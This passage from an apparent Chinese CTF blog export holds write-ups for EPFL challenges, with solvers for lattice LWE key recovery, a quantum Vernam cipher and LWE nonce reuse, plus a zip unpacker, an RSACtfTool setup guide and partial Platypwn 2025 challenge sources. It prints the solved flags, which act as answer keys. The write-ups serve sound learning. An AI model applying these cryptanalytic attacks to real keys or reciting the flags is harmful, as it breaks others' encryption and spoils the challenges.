&quot;r&quot;) as f: data = json.load(f) A_raw = data[&#x27;A&#x27;] t_raw = data[&#x27;t&#x27;] u_list = data[&#x27;u&#x27;] v_list = data[&#x27;v&#x27;] # 1. 构造大矩阵 A_big 和目标向量 t_vec # A_big 的结构: [[M(A00), M(A01)], [M(A10), M(A11)]] # 维度: (2*16) x (2*16) = 32 x 32 blocks = [] for r in range(k): row_blocks = [] for c in range(k): row_blocks.append(make_negacyclic_matrix(A_raw[r][c])) blocks.append(row_blocks) A_big = block_matrix(blocks) # t_vec: 展平 t t_vec = [] for poly in t_raw: t_vec.extend(poly) t_vec = vector(ZZ, t_vec) print(&quot;[-] Constructing Lattice...&quot;) # 2. 构造格基矩阵 L # 维度: 65 x 65 # 结构: # [ qI 0 0 ] # [ A^T I 0 ] # [ -t 0 1 ] dim_target = k * n # 32 dim_secret = k * n # 32 # 构造各部分 M_q = q * identity_matrix(dim_target) M_zero_1 = zero_matrix(dim_target, dim_secret) M_zero_2 = zero_matrix(dim_target, 1) M_A = A_big.transpose() M_I = identity_matrix(dim_secret) M_zero_3 = zero_matrix(dim_secret, 1) M_t = matrix(ZZ, -t_vec) # 1 x 32 M_zero_4 = zero_matrix(1, dim_secret) M_one = matrix(ZZ, [1]) # 拼合矩阵 L = block_matrix([ [M_q, M_zero_1, M_zero_2], [M_A, M_I, M_zero_3], [M_t, M_zero_4, M_one] ]) print(&quot;[-] Running LLL algorithm (this might take a second)...&quot;) L_reduced = L.LLL() # 3. 寻找短向量并恢复私钥 s # 理论上最短的非零向量应该是 (-e, s, 1) 或者其相反数 # 我们检查最后一列是否为 1 或 -1 s_recovered = None for row in L_reduced: if row[-1] == 1: # 向量格式可能是 (-e, s, 1) # s 位于中间的 32 位 (索引 32 到 63) s_vec = row[dim_target : dim_target + dim_secret] s_recovered = s_vec break elif row[-1] == -1: # 向量是 (e, -s, -1)，取反 s_vec = -row[dim_target : dim_target + dim_secret] s_recovered = s_vec break if s_recovered is None: print(&quot;Failed to recover key.&quot;) return print(f&quot;Secret key found!&quot;) s_polys = [] for i in range(k): poly = list(s_recovered[i*n : (i+1)*n]) s_polys.append(poly) # 定义多项式乘法 (模 x^16 + 1, 模 q) def poly_mul(p1, p2): res = [0] * (2 * n) for i, c1 in enumerate(p1): for j, c2 in enumerate(p2): res[i+j] += c1 * c2 # 模 x^16 + 1 归约 # x^16 = -1, x^17 = -x ... final = [0] * n for i in range(len(res)): if i &lt; n: final[i] = (final[i] + res[i]) else: final[i - n] = (final[i - n] - res[i]) return [x % q for x in final] # 定义向量点积 def vec_dot(v1_polys, v2_polys): sum_poly = [0] * n for p1, p2 in zip(v1_polys, v2_polys): prod = poly_mul(p1, p2) for i in range(n): sum_poly[i] = (sum_poly[i] + prod[i]) % q return sum_poly flag_bits = &quot;&quot; # 遍历每个密文块 for i in range(len(u_list)): u_block = u_list[i] v_poly = v_list[i] shared_secret = vec_dot(s_polys, u_block) # v - s^T * u # 结果应该是 m * (q//2) + error noisy_m = [(v_val - s_val) % q for v_val, s_val in zip(v_poly, shared_secret)] # Phase 3: 解码 (判断距离 0 近还是 q/2 近) center = q // 2 for val in noisy_m: dist_0 = min(val, q - val) dist_center = abs(val - center) if dist_0 &lt; dist_center: flag_bits += &quot;0&quot; else: flag_bits += &quot;1&quot; flag = &quot;&quot; try: for i in range(0, len(flag_bits), 8): byte = flag_bits[i:i+8] if len(byte) == 8: flag += chr(int(byte, 2)) print(f&quot;Flag: &#123;flag&#125;&quot;) except Exception as e: print(f&quot;Decoding error: &#123;e&#125;&quot;)solve()# EPFL&#123;N07_0N1Y_7H3_m3n_BU7_7h3_w0M3N_4ND_CHILDR3N_7o0_T50nanWvW1&#125; Quantum vernam题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#!/usr/bin/env -S python3 -uimport osimport numpy as npfrom math import sqrt# no need quantum libraries here, only linear algebra. from scipy.stats import unitary_groupdef string_to_bits(s): bits = [] for byte in s: for i in range(8): bits.append((byte &gt;&gt; (7 - i)) &amp; 1) return bitsdef bit_to_qubit(bit): if bit == 0: return np.array([1,0]) # |0&gt; else: return np.array([0, 1]) # |1&gt;def encryption(key, message,gate1,gate2,x): key_bits = string_to_bits(key) message_bits = string_to_bits(message) cipher = [] encryption_matrix = np.array([]) PauliX = np.array([(0,1), (1,0)]) PauliZ = np.array([(1,0), (0,-1)]) for k, m in zip(key_bits, message_bits): qubit = bit_to_qubit(m) qubit = gate1 @ qubit if k == 1: qubit = x @ qubit qubit = gate2 @ qubit cipher.append(qubit) return cipherdef measurement(cipher): measured_bits = [] for qubit in cipher: prob_0 = qubit[0]*qubit[0].conjugate() if np.random.rand() &lt; prob_0: measured_bits.append(0) else: measured_bits.append(1) return measured_bitsdef bits_to_string(bits): bytes_list = [] for i in range(0, len(bits), 8): byte = 0 for j in range(8): byte = (byte &lt;&lt; 1) | bits[i + j] bytes_list.append(byte) return bytes(bytes_list) ####################################################################################FLAG = b&quot;EPFL&#123;FAKEFLAAAAAAAG&#125;&#125;&quot;n = len(FLAG)key = os.urandom(n)x = unitary_group.rvs(2)print(&quot;Welcome to the Quantum Vernam Cipher Encryption! Key and flag have same length, try to break perfect secrecy if you can.&quot;)print(&quot;\\n&quot;)print(&#x27;The qubits will be encrypted with the matrix x = &#x27;,x)print(&quot;\\n&quot;)print(&quot;You can apply any gate you want to the qubits before and after measurement as a 2X2 matrix, choose your favorite one :)&quot;)print(&quot;\\n&quot;)print(&quot;Also pls remember that in python, j is the imaginary unit, not i.&quot;)print(&#x27;\\n&#x27;)print(&#x27;Enter coefficients for the first matrix that will be applied BEFORE encryption:&#x27;)print(&#x27;Enter first matrix element:&#x27;) a1 = complex(input())print(&#x27;Enter second matrix element:&#x27;)b1 = complex(input())print(&#x27;Enter third matrix element:&#x27;)c1 = complex(input())print(&#x27;Enter fourth matrix element:&#x27;)d1 = complex(input())gate1 = np.array([(a1,b1),(c1,d1)])print(&#x27;\\n&#x27;)print(&#x27;Enter coefficients for the second matrix that will be applied AFTER encryption:&#x27;)print(&#x27;Enter first matrix element:&#x27;) a2 = complex(input())print(&#x27;Enter second matrix element:&#x27;)b2 = complex(input())print(&#x27;Enter third matrix element:&#x27;)c2 = complex(input())print(&#x27;Enter fourth matrix element:&#x27;)d2 = complex(input())gate2 = np.array([(a2,b2),(c2,d2)])# vérifie que les matrices sont unitairesdef is_unitary(matrix): identity = np.eye(matrix.shape[0]) return np.allclose(matrix.conj().T @ matrix, identity) assert is_unitary(gate1), &quot;Gate 1 is not unitary!&quot; assert is_unitary(gate2), &quot;Gate 2 is not unitary!&quot;cipher = encryption(key, FLAG,gate1,gate2,x)measurement_result = measurement(cipher)print(&quot;measurement:&quot;, measurement_result)print(bits_to_string(measurement_result)) 分析这道题算是模拟了一个单量子比特的传输过程。 12345def bit_to_qubit(bit): if bit == 0: return np.array([1,0]) # |0&gt; else: return np.array([0, 1]) # |1&gt; 就是把普通的0和1转成了量子计算里的比特$|0\\rangle$和$|1\\rangle$（用矩阵表示的）。 1x = unitary_group.rvs(2) 并且生成了一个$2 \\times 2$的随机的unitary矩阵。 然后来看加密的部分： 12345678910111213141516def encryption(key, message,gate1,gate2,x): key_bits = string_to_bits(key) message_bits = string_to_bits(message) cipher = [] for k, m in zip(key_bits, message_bits): qubit = bit_to_qubit(m) qubit = gate1 @ qubit if k == 1: qubit = x @ qubit # 如果 k == 0就什么都不做，相当于乘单位矩阵I qubit = gate2 @ qubit cipher.append(qubit) return cipher 对于每一个比特$m$和密钥位 $k$，最终生成的向量$|\\psi_{final}\\rangle$为： |\\psi_{final}\\rangle = G_2 \\cdot (X^k) \\cdot G_1 \\cdot |m\\rangle其中$X^k$指的是： X^k = \\begin{cases} X, & k=1 \\\\ I, & k=0 \\end{cases}因为$k$是随机的，所以$X^k$也是随机的。不过$G_1, G_2$都是我们给的，可以自由选择。 测量部分： 12345678910def measurement(cipher): measured_bits = [] for qubit in cipher: prob_0 = qubit[0] * qubit[0].conjugate() if np.random.rand() &lt; prob_0: measured_bits.append(0) else: measured_bits.append(1) return measured_bits 同样模拟的是量子计算里的测量方法：假设最终向量是 $|\\psi\\rangle = \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix}$，那么 测量得到0的概率是 $|\\alpha|^2$。 测量得到1的概率是 $|\\beta|^2$。 且 $|\\alpha|^2 + |\\beta|^2 = 1$。 而我们最终从服务器得到的内容就是加密步骤里的$|\\psi_{final}\\rangle$的测量结果。 所以为了能够”还原“原本的flag，我们只能构造特殊的$G_1, G_2$，使得最后的$|\\psi_{final}\\rangle$等于原本的$m$，或者严格来讲只要等于$\\lambda \\cdot m$即可。这样一来最后的测量结果也就等于原本的flag了。 那么最后剩下的就是纯线性代数的问题了。 因为$X$是unitary的，所以可以很轻易的将其对角化，也就是说设$V$是由$X$的特征向量组成的矩阵，那么就有： VXV^{-1} = D其中$D = diag(\\lambda_1, \\lambda_2)$（X的特征值），并且$V^{-1} = V^H$。（共轭转置） 这样一来就有 \\begin{align*} |\\psi_{final}\\rangle_1 &= \\lambda_1 \\cdot |m\\rangle_1\\\\ |\\psi_{final}\\rangle_2 &= \\lambda_2 \\cdot |m\\rangle_2\\\\ \\end{align*}由于$X$是unitary的，所以它的特征值的norm都等于1。所以依旧可以满足 ||\\psi_{final}\\rangle_1|^2 + ||\\psi_{final}\\rangle_2|^2 = 1不会影响到最后的测量。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *import numpy as npimport re# context.log_level = &quot;debug&quot;r = remote(&#x27;chall.polygl0ts.ch&#x27;, 6002)# 简单处理一下接收到的Xr.recvuntil(b&#x27;x = &#x27;)x_str = r.recvuntil(b&#x27;\\n\\n&#x27;).decode().strip()clean_str = x_str.replace(&#x27;[&#x27;, &#x27;&#x27;).replace(&#x27;]&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27; &#x27;)elements = clean_str.split()matrix_elements = []for el in elements: if el: matrix_elements.append(complex(el)) X = np.array(matrix_elements).reshape(2, 2)print(f&quot;Matrix X:\\n&#123;X&#125;&quot;)# 计算特征值和特征向量# w 是特征值, v 是特征向量矩阵w, v = np.linalg.eig(X)# Gate 1 就是特征向量矩阵G1 = v# Gate 2 是 Gate 1 的逆矩阵 (对于酉矩阵，即共轭转置)G2 = np.linalg.inv(G1)print(f&quot;[*] Calculated G1 (Eigenvectors):\\n&#123;G1&#125;&quot;)print(f&quot;[*] Calculated G2 (Inverse):\\n&#123;G2&#125;&quot;)# 发送 Gate 1# 分别输入 a1, b1, c1, d1# 对应矩阵 [[a, b], [c, d]]r.sendlineafter(b&#x27;first matrix element:&#x27;, str(G1[0, 0]).encode()) # a1r.sendlineafter(b&#x27;second matrix element:&#x27;, str(G1[0, 1]).encode()) # b1r.sendlineafter(b&#x27;third matrix element:&#x27;, str(G1[1, 0]).encode()) # c1r.sendlineafter(b&#x27;fourth matrix element:&#x27;, str(G1[1, 1]).encode()) # d1# 发送 Gate 2r.sendlineafter(b&#x27;first matrix element:&#x27;, str(G2[0, 0]).encode()) # a2r.sendlineafter(b&#x27;second matrix element:&#x27;, str(G2[0, 1]).encode()) # b2r.sendlineafter(b&#x27;third matrix element:&#x27;, str(G2[1, 0]).encode()) # c2r.sendlineafter(b&#x27;fourth matrix element:&#x27;, str(G2[1, 1]).encode()) # d2r.recvuntil(b&#x27;measurement:&#x27;)result = r.recvall().decode()print(result)# EPFL&#123;URE_3ITH3R_QU4NTUM_BOSSssss_OR_LINALG_BOSS&#125; Attack of the Clones题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import numpy as npimport jsontry: from flag import flagexcept: flag = &quot;redacted_this_is_just_so_that_it_works_and_you_can_test_locally.&quot;m_b = np.array([int(c) for char in flag for c in format(ord(char), &#x27;08b&#x27;)])# Parametersq = 3329n = 512k = 4f = np.array([1] + [0]*(n-1) + [1])assert len(m_b)==n# ---------- Helper functions ----------def _small_noise(n, weight=2): coeffs = np.zeros(n, dtype=int) idx = np.random.choice(n, size=weight, replace=False) signs = np.random.choice([-1, 1], size=weight) coeffs[idx] = signs return coeffsdef _vec_poly_mul(v0, v1): def _poly_mul(a, b): res = np.convolve(a, b) for i in range(n, len(res)): res[i - n] = (res[i - n] - res[i]) % q return res[:n] % q return sum((_poly_mul(a, b) for a, b in zip(v0, v1))) % qdef encrypt(A, t, m_b, r, e_1, e_2): u = np.array([(mat + err) % q for mat, err in zip([_vec_poly_mul(row, r) for row in A.T], e_1) ]) tr = _vec_poly_mul(t, r) m = (m_b * ((q + 1)//2)) % q v = (tr + e_2 + m) % q return u, v# ---------- Key generation ----------A_1 = np.array([np.array([np.random.randint(0, q, n) for _ in range(k)]) for _ in range(k)])A_2 = np.array([np.array([np.random.randint(0, q, n) for _ in range(k)]) for _ in range(k)])s_1 = np.array([_small_noise(n, n*2//3) for _ in range(k)])s_2 = np.array([_small_noise(n, n*2//3) for _ in range(k)])e = np.array([_small_noise(n) for _ in range(k)])t_1 = np.array([(_vec_poly_mul(row, s_1) + err) % q for row, err in zip(A_1, e)])t_2 = np.array([(_vec_poly_mul(row, s_2) + err) % q for row, err in zip(A_2, e)])# ---------- Encryption ----------r = [_small_noise(n) for _ in range(k)]e_1 = [_small_noise(n) for _ in range(k)]e_2 = _small_noise(n)u_1, v_1 = encrypt(A_1, t_1, m_b, r, e_1, e_2)u_2, v_2 = encrypt(A_2, t_2, m_b, r, e_1, e_2)# ---------- Giving keys to user ---------------keys = &#123; &quot;A_1&quot; : A_1.tolist(), &quot;t_1&quot; : t_1.tolist(), &quot;A_2&quot; : A_2.tolist(), &quot;t_2&quot; : t_2.tolist(), &quot;u_1&quot; : u_1.tolist(), &quot;u_2&quot; : u_2.tolist(), &quot;v_1&quot; : v_1.tolist(), &quot;v_2&quot; : v_2.tolist() &#125;with open(&quot;keys.json&quot;, &quot;w&quot;) as f: f.write(json.dumps(keys)) 分析这道题又是LWE。 加密的流程和之前的基本上一样，但是注意这里： 123456r = [_small_noise(n) for _ in range(k)]e_1 = [_small_noise(n) for _ in range(k)]e_2 = _small_noise(n)u_1, v_1 = encrypt(A_1, t_1, m_b, r, e_1, e_2)u_2, v_2 = encrypt(A_2, t_2, m_b, r, e_1, e_2) 2次加密用了相同的$r,e_1, e_2$。 也就是说我们现在有： \\begin{align} u_1 &= A_1^T r + e_1\\\\ v_1 &= t_1^T r + e_2 + \\text{Message}\\\\ u_2 &= A_2^T r + e_1\\\\ v_2 &= t_2^T r + e_2 + \\text{Message} \\end{align}(1)减(3)就会得到： u_1 - u_2 = A_1^T r + e_1 - (A_2^T r + e_1) = (A_1^T-A_2^T) r因为$u_1,u_2,A_1,A_2$都是已知的，所以我们可以直接得到$r$。从而得到 e_2 + \\text{Message} = v_1 - t_1^T r并且由于$e_2$是系数很小的噪音向量，我们可以很轻松地还原明文。 代码这道题的思路很简单，但是数据处理有亿点点麻烦（各种数据类型的转换）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138import jsonn = 512q = 3329k = 4F = GF(q)def get_negacyclic_matrix(coeffs): &quot;&quot;&quot; 创建多项式的负循环矩阵。 如果系数少于 n，则填充 0。 &quot;&quot;&quot; c = list(coeffs) if len(c) &lt; n: c = c + [0]*(n - len(c)) M = Matrix(F, n, n) current = vector(F, c) for i in range(n): M.set_column(i, current) # 计算下一列：右移，溢出部分取反移到头部 last = current[n-1] current = vector(F, [-last] + list(current[:-1])) return Mprint(&quot;[*] Loading data...&quot;)with open(&quot;keys.json&quot;, &quot;r&quot;) as f: data = json.load(f)A1_data = data[&quot;A_1&quot;]A2_data = data[&quot;A_2&quot;]u1_data = data[&quot;u_1&quot;]u2_data = data[&quot;u_2&quot;]t1_data = data[&quot;t_1&quot;]v1_data = data[&quot;v_1&quot;]# 1. 构建线性方程组 M * r = b# 方程来源: (u1[i] - u2[i]) = Sum_j ( P_A1_ij - P_A2_ij ) * r[j]# 其中 P_A_ij 是由切片 A[0..3][j][i] 构成的“小”多项式print(&quot;[*] Building the large linear system (2048x2048)...&quot;)M_big = Matrix(F, k*n, k*n)b_big = vector(F, k*n)# 构建目标向量 b = u1 - u2# 只需要前 k=4 个多项式 (因为 encrypt 只输出了前4个)for i in range(k): poly_diff = vector(F, u1_data[i]) - vector(F, u2_data[i]) for j in range(n): b_big[i*n + j] = poly_diff[j]# 构建大矩阵 M# i 是方程组的行块索引 (对应 u 的下标)# j 是方程组的列块索引 (对应 r 的下标)for i in range(k): for j in range(k): # 提取切片数据: A[x][j][i] for x in 0..3 # 这对应于 keys.json 中的 A_1[x][j][i] # 注意: JSON 中的 A 是 list[row][col][coeff] slice1 = [A1_data[x][j][i] for x in range(k)] slice2 = [A2_data[x][j][i] for x in range(k)] poly1 = vector(F, slice1) poly2 = vector(F, slice2) diff_poly = poly1 - poly2 # 将这个小多项式转换为 n*n 的负循环矩阵块 block = get_negacyclic_matrix(list(diff_poly)) M_big.set_block(i*n, j*n, block)# 2. 求解 rprint(&quot;[*] Solving linear system...&quot;)try: # M_big * r_vec = b_big r_solution_vec = M_big.solve_right(b_big) print(&quot;[+] System solved!&quot;)except ValueError: print(&quot;[-] System is inconsistent or singular.&quot;) exit()# 将解向量重组为多项式列表r_polys = []for i in range(k): r_polys.append(r_solution_vec[i*n : (i+1)*n])# 3. 解密# v1 = t1 . r + e2 + m# m_approx = v1 - t1 . rprint(&quot;[*] Decrypting...&quot;)# 计算点积 t1 . rdot_product = vector(F, n)for i in range(k): # t1 和 r 都是正常长度的多项式，正常相乘 M_t = get_negacyclic_matrix(t1_data[i]) r_vec = vector(F, r_polys[i]) dot_product += M_t * r_vec# 计算带噪声的明文v1_vec = vector(F, v1_data)# 确保 v1 长度对齐if len(v1_vec) &lt; n: v1_vec = vector(F, list(v1_vec) + [0]*(n-len(v1_vec)))m_noisy = v1_vec - dot_product# 4. 解码比特flag_bits = &quot;&quot;scale = (q + 1) // 2for val in m_noisy: val = int(val) # 0 映射到 0, 1 映射到 q/2 # 计算到 0 的距离 (考虑环绕) dist_0 = min(val, q - val) # 计算到 q/2 的距离 dist_1 = abs(val - scale) if dist_0 &lt; dist_1: flag_bits += &quot;0&quot; else: flag_bits += &quot;1&quot;# 5. 转为 ASCIIprint(&quot;[*] Converting to flag...&quot;)flag = &quot;&quot;for i in range(0, len(flag_bits), 8): byte = flag_bits[i:i+8] if len(byte) &lt; 8: break char_code = int(byte, 2) if char_code == 0: break flag += chr(char_code)print(f&quot;FLAG: &#123;flag&#125;&quot;)# EPFL&#123;2oo000_un1t5_r34dy_w1th_4_m1ll10n_m0r3_w3ll_0n_th3_w4y_i6o&#125; Ez Part题目 分析代码1 Misczipbomb 给了份zip文件，每轮解压都能得到一份txt文件以及一份zip文件。所以直接写个自动化的脚本一直解压就好了。甚至每个压缩包连密码都没有，所以特别简单。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import zipfileimport osdef unzip_and_clean(start_filename): current_zip = start_filename round_count = 0 while True: round_count += 1 # 1. 解压当前文件 try: with zipfile.ZipFile(current_zip, &#x27;r&#x27;) as zf: zf.extractall() # 获取当前包里包含的文件名列表 files_in_zip = zf.namelist() except Exception as e: print(f&quot;[-] 解压中断或出错: &#123;e&#125;&quot;) break # 2. 寻找下一层 zip 和当前的 txt next_zip = None current_txt = None for file in files_in_zip: if file.endswith(&#x27;.zip&#x27;): next_zip = file elif file.endswith(&#x27;.txt&#x27;): current_txt = file # 3. 分情况处理清理逻辑 if next_zip: # --- 情况 A: 还有下一层 (这是中间层) --- print(f&quot;[Round &#123;round_count&#125;] 正在处理，发现下一层: &#123;next_zip&#125;&quot;) if current_txt and os.path.exists(current_txt): os.remove(current_txt) if current_zip != start_filename and os.path.exists(current_zip): os.remove(current_zip) # 更新目标，继续循环 current_zip = next_zip else: # --- 情况 B: 没有下一层了 (到底了) --- if current_zip != start_filename and os.path.exists(current_zip): os.remove(current_zip) if current_txt: try: with open(current_txt, &#x27;r&#x27;) as f: print(f&quot;内容为: &#123;f.read().strip()&#125;&quot;) except: print(&quot;无法读取最终文件内容&quot;) else: print(&quot;最后一层里没有txt文件。&quot;) breakstart_file = &quot;bomb.zip&quot;unzip_and_clean(start_file) 最后得到flag.txt： 1EPFL&#123;m4yb3_TH3_r3A1_r4M_15_th3_Fr13nd5_w3_m4d3_410ng_th3_w4y&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"比赛Writeup","slug":"CTF/比赛Writeup","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%AF%94%E8%B5%9BWriteup/"}],"tags":[{"name":"LWE","slug":"LWE","permalink":"https://archer-baiyi.github.io/en/tags/LWE/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/en/tags/sage/"},{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/en/tags/writeup/"},{"name":"lattice","slug":"lattice","permalink":"https://archer-baiyi.github.io/en/tags/lattice/"},{"name":"numpy","slug":"numpy","permalink":"https://archer-baiyi.github.io/en/tags/numpy/"}]},{"title":"RSACtfTool，RSA攻击工具","slug":"CTF/Crypto/RSACtfTool，RSA攻击工具","date":"2025-11-27T20:23:17.000Z","updated":"2025-11-28T00:34:40.192Z","comments":true,"path":"2025/11/27/CTF/Crypto/RSACtfTool，RSA攻击工具/","permalink":"https://archer-baiyi.github.io/en/2025/11/27/CTF/Crypto/RSACtfTool%EF%BC%8CRSA%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7/","excerpt":"","text":"RSACtfTool是一个开源的 Python 工具，可以高效地自动化攻击和破解由弱参数生成的RSA 密钥。 它集成了大量针对 RSA 算法漏洞的攻击脚本，并且会自动查询FactorDB。不过它通常需要依赖SageMath或GMP等库。 安装/配置GitHub链接： https://github.com/RsaCtfTool/RsaCtfTool 1. 安装系统级依赖在克隆代码之前，必须先安装底层的数学库，否则安装 Python 库时会报错。 12sudo apt-get updatesudo apt-get install git python3-pip python3-dev libgmp3-dev libmpc-dev libmpfr-dev libssl-dev 下载： 1git clone https://github.com/RsaCtfTool/RsaCtfTool.git 安装Python依赖： 1234cd RsaCtfToolpip3 install -r requirements.txt# 或者是 sage -pip install -r requirements.txt 尝试运行： 1sage -python -m RsaCtfTool.main -h 如果遇到ModuleNotFoundError的话：（大概率是因为文件在子目录里，Python 有时候会找不到依赖库的路径。） 则需要把 src 目录加入到 Python 的搜索路径中： 1export PYTHONPATH=$PYTHONPATH:$(pwd)/src 然后再运行： 1sage -python -m RsaCtfTool.main -h 看到这样的页面就代表成功了： 快捷方式： 可以给它设置成一个全局的快捷方式： 12345678# 1. 确保在RsaCtfTool的根目录下cd ~/ctf-kali/crypto/RsaCtfTool# 2. 将带有绝对路径的命令追加到配置文件中echo &quot;alias rsactf=&#x27;PYTHONPATH=$(pwd)/src sage -python -m RsaCtfTool.main&#x27;&quot; &gt;&gt; ~/.zshrc# 3. 让配置立即生效source ~/.zshrc （Kali Linux默认使用zsh，所以我们写到.zshrc。） 之后直接在任意路径下用这个命令就好123rsactfrsactf -h 如何使用","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"rsa","slug":"rsa","permalink":"https://archer-baiyi.github.io/en/tags/rsa/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/en/tags/sage/"}]},{"title":"Platypwn 2025 CTF Writeup","slug":"CTF/比赛Writeup/Platypwn-2025-CTF-Writeup","date":"2025-11-27T19:58:59.000Z","updated":"2025-11-29T21:39:03.615Z","comments":true,"path":"2025/11/27/CTF/比赛Writeup/Platypwn-2025-CTF-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/11/27/CTF/%E6%AF%94%E8%B5%9BWriteup/Platypwn-2025-CTF-Writeup/","excerpt":"Platypwn 2025 比赛的题解，涉及方向：Crypto","text":"CryptoCognitive Reminder Call题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from binascii import crc32import osimport secretsimport sysfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.primitives.hashes import Hash, SHA256from cryptography.hazmat.primitives.padding import PKCS7def mac(key, message): return crc32(key + message).to_bytes(4)def send_authenticated(key, used_nonces, message): nonce = secrets.token_bytes(4) while nonce in used_nonces: nonce = secrets.token_bytes(4) used_nonces.add(nonce) tag = mac(key, nonce + message.encode()) print(message) print(f&#x27;Note: This message was sent over an authenticated channel. Its tag is &#123;tag.hex()&#125; with nonce &#123;nonce.hex()&#125;.&#x27;)def encrypt(key_parts, message): iv = secrets.token_bytes(16) hasher = Hash(SHA256()) for part in key_parts: hasher.update(part) key = hasher.finalize() padder = PKCS7(128).padder() plaintext = padder.update(message.encode()) + padder.finalize() cipher = Cipher(algorithms.AES256(key), modes.CBC(iv)) encryptor = cipher.encryptor() return iv + encryptor.update(plaintext) + encryptor.finalize()def main(): flag = os.getenv(&#x27;FLAG&#x27;) if flag is None: print(&#x27;Please set the flag via env variable!&#x27;) sys.exit(1) enc_key_parts = [secrets.token_bytes(16) for _ in range(4)] mac_key = secrets.token_bytes(16) used_nonces = set() send_authenticated(mac_key, used_nonces, f&#x27;Here is the flag: &#123;encrypt(enc_key_parts, flag).hex()&#125;&#x27;) enc_key_parts_checksums = list(map(lambda kp: crc32(kp), enc_key_parts)) enc_key_parts = None send_authenticated(mac_key, used_nonces, &#x27;I have forgotten my key :(\\nBut here are 4 congnitive reminders of my key:&#x27;) send_authenticated(mac_key, used_nonces, str(enc_key_parts_checksums)) try: print(&#x27;Please remind me of my key:&#x27;) part1 = bytes.fromhex(input(&#x27;Part 1 (hex): &#x27;)) part2 = bytes.fromhex(input(&#x27;Part 2 (hex): &#x27;)) part3 = bytes.fromhex(input(&#x27;Part 3 (hex): &#x27;)) part4 = bytes.fromhex(input(&#x27;Part 4 (hex): &#x27;)) print(&#x27;This is an authenticated channel!&#x27;) nonce = bytes.fromhex(input(&#x27;Please provide your nonce (hex): &#x27;)) tag = bytes.fromhex(input(&#x27;Please provide the tag of the concatenation of the nonce and the 4 parts (hex): &#x27;)) except ValueError: print(&#x27;Invalid hex!&#x27;) sys.exit(1) if len(nonce) != 4: print(&#x27;Nonce must be 4 bytes long!&#x27;) sys.exit(1) if nonce in used_nonces: print(&#x27;Nonces must not be reused!&#x27;) sys.exit(1) if not secrets.compare_digest(mac(mac_key, nonce + part1 + part2 + part3 + part4), tag): print(&#x27;Invalid tag!&#x27;) sys.exit(1) if crc32(part1) != enc_key_parts_checksums[0] or crc32(part2) != enc_key_parts_checksums[1] or crc32(part3) != enc_key_parts_checksums[2] or crc32(part4) != enc_key_parts_checksums[3]: print(&#x27;I cannot remember it!&#x27;) sys.exit(1) enc_key_parts = [part1, part2, part3, part4] send_authenticated(mac_key, used_nonces, f&#x27;Thanks for reminding me! Here is a reward: &#123;encrypt(enc_key_parts, flag).hex()&#125;&#x27;)if __name__ == &#x27;__main__&#x27;: main() saCReT texts题目123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/env pythonfrom base64 import b64encodefrom math import gcd, lcmfrom pathlib import Pathfrom os import environ, urandomfrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSAfrom Crypto.Random.random import getrandbits, randrangefrom Crypto.Util.number import getPrime, inverse, sizeFLAG = environ[&quot;FLAG&quot;]def EEA(a, b): if b == 0: return (a, 1, 0) g, s, t = EEA(b, a % b) return (g, t, s - (a // b) * t)def CRT(r1, r2, m1, m2): g, k1, k2 = EEA(m1, m2) assert (r2 - r1) % g == 0, &quot;CRT not possible&quot; m = lcm(m1, m2) r = (r1 + m1 * k1 * (r2 - r1) // g) % m return r, m# The sacret texts mentioned this problem# - but not its solution. Can you solve it?def generate_key(nbits=int(&quot;&quot;.join(reversed(&quot;5202&quot;)))): #nbit = 2025 p = getPrime(nbits // 2) # 1012 q = getPrime(nbits // 2) # 1012 N = p * q φ = (p - 1) * (q - 1) # 先构造一个 d，再算它的逆 e。 d = 0 while gcd(d, φ) != 1: dp = getrandbits(nbits // 2 - 1) # 1011 if size(dp) &lt; nbits // 3: # 大于675位 continue dq = getrandbits((nbits - 1) &amp; ((2 &lt;&lt; nbits.bit_length() // 2) - 1)) # 40位 if (dp - dq) % gcd(p - 1, q - 1) != 0: continue d, m = CRT(dp, dq, p - 1, q - 1) d += randrange(0, φ // m) * m e = inverse(d, φ) return RSA.construct((N, e, d, p, q))file = Path(&quot;./key&quot;)try: with file.open(&quot;rb&quot;) as f: rsa_key = RSA.import_key(f.read())except: rsa_key = generate_key() with file.open(&quot;wb&quot;) as f: f.write(rsa_key.export_key())aes_key = urandom(32)nonce = urandom(12)cipher = PKCS1_OAEP.new(rsa_key)enc_aes_key = cipher.encrypt(aes_key)cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)ciphertext, tag = cipher.encrypt_and_digest(FLAG.encode())print(rsa_key.public_key().export_key().decode())print(f&quot;enc_aes_key: &#123;b64encode(enc_aes_key).decode()&#125;&quot;)print(f&quot;nonce: &#123;b64encode(nonce).decode()&#125;&quot;)print(f&quot;ciphertext: 